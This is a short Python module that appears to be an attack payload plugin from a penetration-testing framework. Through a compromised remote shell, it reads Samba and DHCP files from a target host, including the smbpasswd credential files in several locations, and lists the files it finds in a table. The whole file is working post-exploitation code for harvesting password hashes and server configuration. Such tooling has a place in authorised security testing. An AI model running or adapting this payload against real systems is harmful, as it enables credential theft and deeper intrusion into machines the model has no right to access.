import re
from plugins.attack.payloads.base_payload import base_payload
from core.ui.consoleUi.tables import table


class smb_config_files(base_payload):
    '''
    This payload shows SMB configuration files
    '''
    def api_read(self, parameters):
        result = {}
        files = []

        files.append('/usr/local/samba/lib/smb.conf')
        files.append('/etc/smb.conf')
        files.append('/etc/smbpasswd')
        files.append('/etc/smbusers')
        files.append('/etc/smbfstab')
        files.append('/etc/samba/smb.conf')
        files.append('/etc/samba/smbfstab')
        files.append('/etc/samba/smbpasswd')
        files.append('/usr/local/samba/private/smbpasswd')
        files.append('/usr/local/etc/dhcpd.conf')

        for file in files:
            content = self.shell.read(file)
            if content:
                result[ file ] = content
        return result
        
    def run_read(self, parameters):
        api_result = self.api_read( parameters )
        
        if not api_result:
            return 'No SMB configuration files were identified.'
        else:
            rows = []
            rows.append( ['SMB configuration files'] ) 
            rows.append( [] )
            for filename in api_result:
                rows.append( [filename,] )

            result_table = table( rows )
            result_table.draw( 80 )                    

            return
        
